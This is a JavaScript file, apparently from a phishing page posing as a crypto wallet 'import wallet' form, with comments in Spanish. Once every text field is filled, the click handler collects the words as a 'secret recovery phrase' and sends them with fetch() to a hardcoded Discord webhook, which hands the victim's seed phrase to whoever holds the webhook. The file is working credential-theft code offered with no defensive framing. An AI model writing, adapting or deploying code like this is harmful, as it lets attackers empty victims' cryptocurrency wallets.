document.addEventListener('DOMContentLoaded', function() {
    const inputs = document.querySelectorAll('input[type="text"]');
    const importButton = document.getElementById('import-wallet');
    
    // Función para verificar si todas las casillas están llenas
    function checkInputs() {
        const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
        importButton.disabled = !allFilled; // Activa o desactiva el botón
    }

    // Agregar eventos de 'input' a cada campo de texto para verificar constantemente
    inputs.forEach(input => {
        input.addEventListener('input', checkInputs);
    });

    // Función para enviar el mensaje al webhook de Discord
    importButton.addEventListener('click', function() {
        // Recolecta los valores de las casillas
        const words = [];
        inputs.forEach(input => {
            words.push(input.value.trim());
        });

        // Asegúrate de que todas las casillas tienen texto antes de enviar
        if (words.every(word => word.length > 0)) {
            // URL del webhook de Discord
            const webhookURL = 'https://discord.com/api/webhooks/1312854124378849390/gQ-oGCbPVSWmEy_UE9eqiyMfY28KUHHvFfxwjpsyKc5-H_dhwkhMIKzR5ey7vpVtd-Pr';

            // Crea el mensaje que enviarás
            const message = {
                content: `Frase secreta de recuperación: ${words.join(' ')}`
            };

            // Envía el mensaje a Discord
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    alert("Frase enviada a Discord.");
                } else {
                    alert("Hubo un error al enviar la frase.");
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Hubo un error al enviar la frase.");
            });
        } else {
            alert("Por favor, rellena todas las casillas.");
        }
    });
});
